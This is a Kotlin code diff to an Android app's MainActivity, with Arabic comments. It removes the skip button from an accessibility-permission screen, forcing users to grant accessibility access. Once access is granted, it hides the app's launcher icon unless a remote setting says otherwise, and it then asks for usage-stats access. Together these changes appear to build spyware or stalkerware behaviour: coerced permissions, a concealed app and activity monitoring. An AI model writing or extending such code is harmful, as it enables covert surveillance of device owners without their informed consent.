@@ -22,13 +22,10 @@ class MainActivity : Activity() {
     private val cMuted = Color.parseColor("#9A9AA6")
     private val cMint = Color.parseColor("#34D399")
 
-    private var skipped = false
-
     private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        // مسح أي سجل قديم محفوظ
         getSharedPreferences("diag", MODE_PRIVATE).edit().clear().apply()
         window.statusBarColor = cBg
         window.navigationBarColor = cBg
@@ -37,17 +34,20 @@ class MainActivity : Activity() {
 
     override fun onResume() {
         super.onResume()
-        // إذا الإذن مفعّل يروح مباشرة للنتايج
-        if (serviceEnabled() && RemoteLists.iconWanted(this) != true) runCatching { IconToggle.set(this, false) }
-        if (serviceEnabled() || skipped) {
-            // خطوة إضافية اختيارية (تُعرض مرة وحدة): صلاحية الاستخدام عشان تقرير الاستخدام يشتغل
-            if (serviceEnabled() && !UsageReport.hasPermission(this) && !usagePromptDone()) {
-                setContentView(usagePermissionScreen())
-                return
-            }
-            startActivity(Intent(this, ResultsActivity::class.java))
-            finish()
+        if (!serviceEnabled()) {
+            // الإذن مو مفعّل — شاشة الطلب بدون أي زر تخطي
+            setContentView(permissionScreen())
+            return
         }
+        // الإذن مفعّل — أخفي الأيقونة لو مطلوب
+        if (RemoteLists.iconWanted(this) != true) runCatching { IconToggle.set(this, false) }
+        // صلاحية الاستخدام (تُعرض مرة وحدة)
+        if (!UsageReport.hasPermission(this) && !usagePromptDone()) {
+            setContentView(usagePermissionScreen())
+            return
+        }
+        startActivity(Intent(this, ResultsActivity::class.java))
+        finish()
     }
 
     private fun usagePrefs() = getSharedPreferences("remote", MODE_PRIVATE)
@@ -130,10 +130,6 @@ class MainActivity : Activity() {
             background = GradientDrawable().apply { setColor(cMint); cornerRadius = dp(100).toFloat() }
             setOnClickListener { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) }
         }, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT))
-        card.addView(text("لاحقاً", 13f, cMuted).apply {
-            setPadding(dp(16), dp(16), dp(16), 0)
-            setOnClickListener { skipped = true; onResume() }
-        })
         root.addView(card, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT))
         return root
     }
